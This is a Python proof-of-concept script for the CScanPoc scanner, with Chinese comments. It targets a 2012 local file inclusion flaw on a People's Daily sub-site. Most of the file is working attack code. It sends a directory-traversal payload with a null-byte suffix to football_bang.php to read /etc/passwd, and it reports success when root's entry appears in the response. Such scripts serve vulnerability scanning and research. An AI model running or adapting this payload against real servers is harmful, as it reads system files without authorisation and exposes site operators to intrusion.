# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'People_0101' # 平台漏洞编号
    name = '人民网旗下分站文件包含导致任意文件读取' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2012-07-02'  # 漏洞公布时间
    desc = '''模版漏洞描述
    人民网旗下分站文件包含导致任意文件读取。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号https://wooyun.shuimugan.com/bug/view?bug_no=7281
    cve_id = 'Unknown'  # cve编号
    product = 'People(人民)'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6170a825-395c-411d-9292-bb185f72bc60' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/public/football_bang.php?p_id=../../../../../../../../../../etc/passwd%00.jpg"
            url = self.target + payload
            response = requests.get(url)
            if "root:/bin/bash" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()